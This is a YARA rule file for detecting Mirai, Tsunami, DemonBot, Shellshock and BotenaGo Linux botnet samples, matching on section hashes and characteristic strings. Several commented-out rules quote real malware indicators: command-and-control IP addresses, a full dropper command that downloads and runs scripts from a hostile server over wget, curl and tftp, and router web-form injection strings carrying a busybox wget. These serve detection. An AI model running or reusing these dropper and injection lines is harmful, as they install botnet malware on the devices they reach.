import "elf"
import "hash"
include "rules/magics.yar"


rule Mirai_Hsh1 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants including Gafgyt and Tsunami variants (named by ClamAV) using section hash. File only"
    // file fa9878*95ec37, compiled Py
  condition:
    elf_magic and // Detect hash of .shstrtab
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "b748e0aa34cc3bb4dcf0f803be00e8ae"
    )
}


rule Mirai_Hsh2 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants (named by ClamAV) using section hash. File only"
  condition:
    elf_magic and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "90d8eebc2a34162c49ec31cfc660cec1"
    )
}

rule Mirai_Hsh3 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants including Gafgyt variants (named by ClamAV) using section hash"
  condition:
    elf_magic and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "68dd3bd106aab3e99d9a65e4f9bfa7f1" or
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "a4b1a9d3f3622ccb54e615de8005f87f"
    )
}

rule Mirai_Gen1
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Common strings used in Mirai"
  strings:
    $ = "WHO %s" fullword ascii
    $ = "PONG %s" fullword ascii
    $ = "NICK %s" fullword ascii
    $ = "JOIN %s" fullword ascii
  condition:
    elf_exec and
    (
      for any i in (0 .. elf.number_of_sections):
      (
        2 of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
      ) or
      2 of them
    )
}


rule Mirai_Gen2 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Common strings used in Mirai"
  strings:
    // $ = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /" ascii # TODO this goes to heuristic
    $ = "makeIPPacket" fullword ascii
    $ = "UDPRAW" fullword ascii
    $ = "sendRAW"
  condition:
    elf_magic and
    (
      for any i in (0 .. elf.number_of_sections):
      (
        any of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
      ) or
      any of them
    )
}


rule Tsunami_de1b {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    md5 = "de1bbb1e4a94de0d047673adaed080c1"
    description = "Tsunami variant"
  strings:
    $1 = "Tsunami successfully deployed!" ascii
    $2 = ".tsunami -l .t -g" fullword ascii
  condition:
    elf_magic and
    (
      for any i in (0 .. elf.number_of_sections):
      (
        any of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
      ) or
      any of them
    )
}

rule Mirai_4c36 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    md5 = "4c366b0552eac10a254ed2d177ba233d"
  strings:
    $1 = "%9s %3hu %255[^\n]" fullword ascii
    $2 = "oanacroane" fullword ascii
  condition:
    elf_magic and
    (
      for any i in (0 .. elf.number_of_sections):
      (
        any of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
      ) or
      any of them
    )
}


rule Mirai_9c77 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    md5 = "9c77a9f860f2643dc0cdbcd6bda65140"
  strings:
    $1 = "31mip:%s" ascii
  condition:
    elf_magic and
    (
      for any i in (0 .. elf.number_of_sections):
      (
        all of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
      ) or
      all of them
    )
}


rule Mirai_92a0 {
  meta:
    md5 = "92a049c55539666bebc68c1a5d9d86ef"
  strings:
    $1 = "4r3s b0tn3t" fullword ascii
  condition:
    elf_magic and
    (
      for any i in (0 .. elf.number_of_sections):
      (
        all of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
      ) or
      all of them
    )
}

// rule Mirai_Gen2 {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Unique strings of Mirai samples for memory scan"
//   strings:
//     $1 = "4r3s b0tn3t" // 0e492a3be57312e9b53ea378fa09650191ddb4aee0eed96dfc71567863b500a8
//     // strings from 206ad8fec64661c1fed8f20f71523466d0ca4ed9c01d20bea128bfe317f4395a
//     // and 341a49940749d5f07d32d1c8dfddf6388a11e45244cc54bc8768a8cd7f00b46a
//     $2 = "User-Agent: Hello, Momentum"
//     $3 = "GET /shell?cd+/tmp;+wget+http:/\\/"
//     // Found in 5a888ae2128e398b401d8ab8333f0fe125134892b667e1acd3dd3fee98f6ea3f
//     $4 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
//     $5 = "EcstasyCode#0420 | Famy#2900" // d8878a0593c1920571afaa2c024d8d4589f13b334c064200b35af0cff20de3e5
//   condition:
//     any of them
// }


// rule Mirai_TypeC {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "15/11/2021"
//     target = "File, Memory"
//     status = "Tested, confirmed with processes"
//     description = "Strings from dumped mem"
//     hash = "a9878bffe5e771bd09109df185dc41883ca0a560bb7b635abddc4259995ec37"
//   strings:
//     $cc = "194.76.226.240"
//     $s1 = "Device Connected: %s | Port: %s | Arch: %s"
//     $s2 = "TSource Engine Query"
//     $s3 = "L33T HaxErS"
//   condition:
//     $cc or ($s2 and ($s1 or $s3))
// }


// rule Mirai_DemonBot_A
// {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Mirai's variant DemonBot"
//     reference = "https://otx.alienvault.com/malware/Backdoor:Linux%2FDemonBot/fileSamples"
//     date = "12/11/2021"
//     target = "File, memory"
//   strings:
//     $cc = "54.38.218.178"
//     $file_str = "/proc/net/route"
//     $str_1 = "PozHlpiND4xPDPuGE6tq"
//     $str_2 = "tg57YSAcuvy2hdBlEWMv"
//     $str_3 = "VaDp3Vu5m5bKcfCU96RX"
//     $str_4 = "UBWcPjIZOdZ9IAOSZAy6"
//     $str_5 = "JezacHw4VfzRWzsglZlF"
//     $str_6 = "3zOWSvAY2dn9rKZZOfkJ"
//     $str_7 = "oqogARpMjAvdjr9Qsrqj"
//     $str_8 = "yQAkUvZFjxExI3WbDp2g"
//     $str_9 = "35arWHE38SmV9qbaEDzZ"
//     $str_10 = "kKbPlhAwlxxnyfM3LaL0"
//     $str_11 = "a7pInUoLgx1CPFlGB5JF"
//     $str_12 = "yFnlmG7bqbW682p7Bzey"
//     $str_13 = "S1mQMZYF6uLzzkiULnGF"
//     $str_14 = "jKdmCH3hamvbN7ZvzkNA"
//     $str_15 = "bOAFqQfhvMFEf9jEZ89M"
//     $str_16 = "VckeqgSPaAA5jHdoFpCC"
//     $str_17 = "CwT01MAGqrgYRStHcV0X"
//     $str_18 = "72qeggInemBIQ5uJc1jQ"
//     $str_19 = "zwcfbtGDTDBWImROXhdn"
//   condition:
//     $file_str and ($cc or 3 of ($str*))
// }


// rule Shellshock_Generic_A {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Shellshock.A"
//     reference = "https://otx.alienvault.com/indicator/file/88ab21215c71fe88b04ab7b0e6a882a65c25df5aed79232f495f4bdb4c9a3600"
//     date = "12/11/2021"
//     target = "File, memory"
//   strings:
//     $addr_1 = "http://195.58.39.37/bins.sh"
//     $addr_2 = "185.172.110.209"
//     // $str_1 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'"
//     // $str_2 = "cd /tmp; wget http://195.58.39.37/bins.sh || curl -O http://195.58.39.37/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 195.58.39.37 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 195.58.39.37; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh"
//     $cmd_3 = "chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh"
//   condition:
//     any of them
// }


// rule BotenaGo_Generic_A {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     date = "29/11/2021"
//     reference = "https://otx.alienvault.com/indicator/file/2993eaf466f70bf89fec5fa950bf83c09f8b64343d6a121fa1d8988af4ea6ca2"
//     reference = "https://otx.alienvault.com/indicator/file/0c395715bfeb8f89959be721cd2f614d2edb260614d5a21e90cc4c142f5d83ad"
//     reference = "https://cybersecurity.att.com/blogs/labs-research/att-alien-labs-finds-new-golang-malwarebotenago-targeting-millions-of-routers-and-iot-devices-with-more-than-30-exploits"
//   strings:
//     $addr_1 = "107.172.30.215"
//     $addr_2 = "159.65.232.56"
//     $addr_3 = "http://adminisp:adminispbad" nocase
//     $cc_1 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://"
//     $cmd_1 = "/bin/busybox chmod 777 * /tmp/xvg; /tmp/xvg selfrep.huawei"
//   condition:
//     any of them
// }
